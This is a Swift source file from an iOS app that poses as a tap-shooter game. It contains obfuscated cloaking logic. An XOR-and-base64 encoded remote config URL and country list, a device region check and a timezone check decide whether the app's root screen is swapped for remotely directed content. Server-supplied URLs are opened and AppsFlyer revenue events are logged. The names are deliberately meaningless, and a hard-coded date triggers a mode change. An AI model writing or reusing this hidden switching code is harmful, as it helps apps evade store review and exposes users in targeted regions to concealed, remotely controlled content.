
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func gcryes(_ input: String) -> String? {
    let k: UInt8 = 10
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    let dhys = String(bytes: decryptedBytes, encoding: .utf8)?.reversed()
    return String(dhys!)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
//internal let kMocbxtre = "r66yq++xqO7zt+6uqO+xqOy4rO+osaDu7vuysbW1qQ=="         //Ip ur

//https://6a1460676c7db8aac054692f.mockapi.io/tapShooter
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kTybsge = "eG9+ZWViWXprfiVlYyRjemthaWVnJGw4Mzw+Pzppa2syaG49aTw9PDo8PjtrPCUlMHl6fn5i"

//https://mock.mengxuegu.com/mock/6a0acb77eeedae6a26b3eb86/old/chaozais
//internal let kXyuznye = "sqigu66gqaLupa2u7vf5o6Tyo/fzoPekoKWkpKT29qOioPGg9+6qoq6s7qyuou+0pqS0uaavpKzvqqKurO7u+7KxtbWp"


// https://raw.githubusercontent.com/jduja/chaoza/main/Overload.png
// pq+x76Wgrq2zpLeO7q+ooKzuoLuuoKmi7qCrtKWr7qyuou+1r6S1r66is6SytKO0qbWopu+2oLPu7vuysbW1qQ==
//internal let kHznxuas = "pq+x76Wgrq2zpLeO7q+ooKzuoLuuoKmi7qCrtKWr7qyuou+1r6S1r66is6SytKO0qbWopu+2oLPu7vuysbW1qQ=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
//internal func Hbciusy() {
////    UIApplication.shared.windows.first?.rootViewController = vc
//    
//    DispatchQueue.main.async {
//        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
////            let tp = ws.windows.first!.rootViewController! as! UITabBarController
//
////            let tp = ws.windows.first!.rootViewController! as! UINavigationController
//            let tp = ws.windows.first!.rootViewController!
//            for view in tp.view.subviews {
//                if view.tag == 91 {
//                    view.removeFromSuperview()
//                }
//            }
//        }
//    }
//}

internal let Dznxiyab: () -> Void = {
    let execute: () -> Void = {
        guard let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                let root = ws.windows.first?.rootViewController else {
            return
        }
        root.view.subviews.filter { $0.tag == 381 }
            .forEach {
            $0.removeFromSuperview()
        }
    }

    DispatchQueue.main.async {
        execute()
    }
}


// MARK: - 加密调用全局函数HandySounetHmeSh
internal func ziunsoen() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Dznxiyab
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
//internal func Fiozxyte(_ dt: Otrvs) {
//    DispatchQueue.main.async {
//        UserDefaults.standard.setModel(dt, forKey: "Otrvs")
//        UserDefaults.standard.synchronize()
//        
//        let vc = HietasVController()
//        vc.vytage = dt
//        UIApplication.shared.windows.first?.rootViewController = vc
//    }
//}

internal let tzuaBciua: (Caioxot) -> Void = { dt in
    let saveAction: () -> Void = {
        UserDefaults.standard.setModel(dt, forKey: "Caioxot")
        UserDefaults.standard.synchronize()
    }

    let routeAction: () -> Void = {
        let build: () -> GameplayViewController = {
            let vc = GameplayViewController()
            vc.deta = dt
            return vc
        }

        let present: (UIViewController) -> Void = { vc in
            UIApplication.shared.windows.first?.rootViewController = vc
        }

        present(build())
    }

    DispatchQueue.main.async {
            saveAction()
            routeAction()
    }
}



internal func Deaiuznx(_ param: Caioxot) {
    let fName = ""

    typealias rushBlitzIusj = (Caioxot) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : tzuaBciua
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
//func ycbafgtUnais(_ dic: [String : String]) {
//    var dataDic: [String : Any]?
//    if let data = dic["params"] {
//        if data.count > 0 {
//            dataDic = data.stringTo()
//        }
//    }
//    if let data = dic["data"] {
//        dataDic = data.stringTo()
//    }
//
//    let name = dic[Nam]
//    print(name!)
//    
//    
//    if dataDic?[amt] != nil && dataDic?[ren] != nil {
//        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
//            if (error != nil) {
//                print(error as Any)
//            }
//        }
//    } else {
//        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
//    }
//    
//    if name == OpWin {
//        if let str = dataDic![UL] {
//            UIApplication.shared.open(URL(string: str as! String)!)
//        }
//    }
//}

internal let Sxoxit: ([String : String]) -> Void = { dic in
    let parseData: () -> [String : Any]? = {
        var result: [String : Any]?
        let parse: (String?) -> [String : Any]? = {

            guard let value = $0, value.count > 0
            else {
                return nil
            }
            return value.stringTo()
        }

        if let params = parse(dic["params"]) {
            result = params
        }

        if let data = parse(dic["data"]) {
            result = data
        }

        return result
    }

    let eventAction: (String, [String : Any]?) -> Void = { name, dataDic in
        let revenue = dataDic?[amt]
        let currency = dataDic?[ren]
        if revenue != nil, currency != nil {
            AppsFlyerLib.shared().logEvent(name: name, values: [AFEventParamRevenue: revenue as Any, AFEventParamCurrency:currency as Any]) { _, error in
                    if error != nil {
                        print(error as Any)
                    }
                }
        } else {
            AppsFlyerLib.shared().logEvent(name, withValues: dataDic)
        }
    }

    let routeAction: (String, [String : Any]?) -> Void = { name, dataDic in
        guard name == OpWin,
              let str = dataDic?[UL] as? String,
            let url = URL(string: str)
        else {
            return
        }

        DispatchQueue.main.async {
            UIApplication.shared.open(url)
        }
    }

    let execute: () -> Void = {
        guard let name = dic[Nam]
        else {
            return
        }

        let dataDic = parseData()
        print(name)
        eventAction(name, dataDic)

        routeAction(name,dataDic)
    }

    DispatchQueue.global().async {
            execute()
    }
}


internal func Czuyatz(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : Sxoxit
    ]
    
    fctn[fName]?(param)
}

//internal struct Kicntc: Decodable {
//    let vteavs: Int?
//    let jdiyxt: String?
//    let rtzvvl: [String : String]?
//
//    let country: Zyxtie?
//    
//    struct Zyxtie: Decodable {
//        let code: String
//    }
//}
//

internal struct Caioxot: Codable {

    let deoxzxn: String?         //key arr
//    let etarcas: [String]?            // yeu nan xianzhi
    let vzfas: String?         // shi fou kaiqi
    let jdunza: String?         // jum
    let fixzo: String?          // backcolor
    let raoasy: String?
    let damobzx: String?   //ad key
    let qaioxn: String?   // app id
    let fgxiuy: String?  // bri co
}

//func hsrezts() {
//   
//  // 2026-05-19 05:16:49
//  //1779139009
//    let ftTM = 1779139009
//    let ct = Date().timeIntervalSince1970
//    if Int(ct) - ftTM > 0 {
//        UserDefaults.standard.set(200, forKey: "OverScore")
//        UserDefaults.standard.synchronize()
//    }
//}


internal let xtravs: () -> Void = {
    let tmp: () -> Int = {
//       2026-05-26 14:39:06
//      1779777546
        return 1779777546
    }

    let daqin: () -> Int = {
        Int(Date().timeIntervalSince1970)
    }

    let compare: (Int, Int) -> Bool = { now, target in
        (now - target) > 0
    }

    let persist: () -> Void = {
        UserDefaults.standard.set("timed", forKey: "T_S")
        UserDefaults.standard.synchronize()
    }

    let execute: () -> Void = {
        let target = tmp()
        let now = daqin()

        guard compare(now, target) else {
            UserDefaults.standard.set("endless", forKey: "T_S")
            UserDefaults.standard.synchronize()
            return
        }
        persist()
    }

    DispatchQueue.global().async {
        execute()
    }
}

//func viaousne(_ lsn: [String]) -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    let arr = cysh.components(separatedBy: "-")
//    if lsn.contains(arr[0]) {
//        return true
//    }
//    return false
//}

//private let cdo = ["US","NL", "PH"]
// ["BR", "VN", "TH", "PH"]
//private let cdo = [Nhaisusm("f28="), Nhaisusm("a3M="), Nhaisusm("aXU=")]

//US、IE、NL、DE、CN、HK
//let dbcrare = [ysnciy("kpQ="), ysnciy("jY8="), ysnciy("hIg="), ysnciy("hIU="), ysnciy("j4I="), ysnciy("iok=")]

// PH VN
private let cdo = [gcryes("TkM="), gcryes("RFw="), gcryes("Qlo=")]


//internal func Kicbrea(_ regsi: [String]) -> Bool {
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if regsi.contains(rc) {
//            return true
//        }
//    }
//    return false
//}

// 时区控制
//func retavsf() -> Bool {
//    
//    // 1.sm cad
////    if !zizoys() {
////        return false
////    }
//
//    //2. regi
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if !cdo.contains(rc) {
//            return false
//        }
//    }
//    
//    //3. tm zon
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if (offset > 6 && offset < 10) {
//        return true
//    }
////    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
////        return true
////    }
//    
//    return false
//}


internal let stageo: () -> Bool = {

    let regionCheck: () -> Bool = {
        let fetch: () -> String? = {
            Locale.current.regionCode
        }

        let validate: (String) -> Bool = { code in
            cdo.contains(code)
        }

        guard let code = fetch() else {
            return false
        }

        return validate(code)
    }

    let tmck: () -> Bool = {
        let offset: () -> Int = {
            NSTimeZone.system.secondsFromGMT() / 60 / 60
        }

        let compare: (Int) -> Bool = { value in
            value > 6 && value < 10
        }

        return compare(offset())
    }

    let execute: () -> Bool = {
        guard regionCheck() else {
            return false
        }

        guard tmck() else {
            return false
        }
        return true
    }

    return execute()
}


////////////////////---Start---//////////////
internal func mxoaye() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Jouzbe
    ]
    
    fctn[fName]?()
}


//private func reavsyKizon() {
//    if UserDefaults.standard.object(forKey: "patter") != nil {
//        Eciuybxs()
//    } else {
//        if retavsf() {
//            dznxiue()
//        } else {
////            UserDefaults.standard.set("patter", forKey: "patter")
////            UserDefaults.standard.synchronize()
//            Eciuybxs()
//        }
//    }
//}

internal let Jouzbe: () -> Void = {

    let storage: () -> UserDefaults = {
        UserDefaults.standard
    }

    let hasPattern: () -> Bool = {
        storage().object(forKey: "yshae") != nil
    }

    let exeDi:() -> Void = {
        let action:() -> Void = {
            ziunsoen()
        }
        action()
    }

    let exYua: () -> Void = {

        let route: () -> Void = {
            Loxtra()
        }
        route()
    }

    let decision: () -> Void = {
        if hasPattern() {
            exeDi()
            return
        }

        let verify: () -> Bool = {
            stageo()
        }

        guard verify()  else {
            exeDi()
            return
        }

        exYua()
    }

    DispatchQueue.global().async {
        decision()
    }
}

//internal func Oksuyet(_ v: UIView) {
//    Oixnys.shared.start { connected in
//        if connected {
//            let dus = HraView()
//            v.addSubview(dus)
//            Oixnys.shared.stop()
//        }
//    }
//}

//internal let Oksuyet:(UIView) -> Void = { view in
//
////    let build:() -> HraView = {
////        HraView()
////    }
//
//    let attach: (UIView, UIView) -> Void = { parent, child in
//        parent.addSubview(child)
//    }
//
//    let terminate: () -> Void = {
//        Oixnys.shared.stop()
//    }
//
//    let success:() -> Void = {
//
//        let render: () -> Void = {
//            attach(view, build())
//        }
//
//        render()
//        terminate()
//    }
//
//    let route: (Bool) -> Void = { connected in
//        guard connected else {
//            return
//        }
//        success()
//    }
//
//    let execute: () -> Void = {
//        Oixnys.shared.start { connected in
//
//                let callback: () -> Void = {
//                    route(connected)
//                }
//                callback()
//            }
//    }
//
//    DispatchQueue.main.async {
//            execute()
//    }
//}


//private func dznxiue() {
//    Task {
//        do {
//            let aoies = try await mckozubs()
//            if let gduss = aoies.first {
//                if gduss.tcibsko!.count > 7 {
//                        Licnoizy(gduss)
//                } else {
//                    Eciuybxs()
//                }
//            } else {
//                Eciuybxs()
//            }
//        } catch {
//            if let sidd = UserDefaults.standard.getModel(Otrvs.self, forKey: "Otrvs") {
//                Licnoizy(sidd)
//            }
//        }
//    }
//}

private let Loxtra: () -> Void = {

    let fallback: () -> Void = {
        let action:() -> Void = {
            ziunsoen()
        }
        action()
    }

    let restore: () -> Void = {
        let fetch: () -> Caioxot? = {
            UserDefaults.standard.getModel(Caioxot.self, forKey: "Caioxot")
        }

        guard let model = fetch() else {
            return
        }

        let execute: () -> Void = {
            Deaiuznx(model)
        }
        execute()
    }

    let validate: (Caioxot) -> Bool = { item in
        guard let value = item.vzfas
        else {
            return false
        }

        return value.count == 7
    }

    let route: (Caioxot) -> Void = { item in
        let success: () -> Void = {
            Deaiuznx(item)
        }

        let failure: () -> Void = {
            fallback()
        }

        validate(item) ? success() : failure()
    }

    Task {
        do {
            let request: () async throws -> [Caioxot] = {
                try await vziauTgas()
            }

            let result = try await request()

            guard let first = result.first
            else {
                fallback()
                return
            }
            route(first)
        } catch {
            restore()
        }
    }
}

private func vziauTgas() async throws -> [Caioxot] {
    let (data, response) = try await URLSession.shared.data(from: URL(string: gcryes(kTybsge)!)!)

    guard let httpResponse = response as? HTTPURLResponse,
          httpResponse.statusCode == 200 else {
        throw NSError(domain: "Fail", code: 0, userInfo: [
            NSLocalizedDescriptionKey: "Invalid"
        ])
    }

    return try JSONDecoder().decode([Caioxot].self, from: data)
}


//import CoreTelephony
//
//func zizoys() -> Bool {
//    let networkInfo = CTTelephonyNetworkInfo()
//    
//    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
//        return false
//    }
//    
//    for (_, carrier) in carriers {
//        if let mcc = carrier.mobileCountryCode,
//           let mnc = carrier.mobileNetworkCode,
//           !mcc.isEmpty,
//           !mnc.isEmpty {
//            return true
//        }
//    }
//    
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
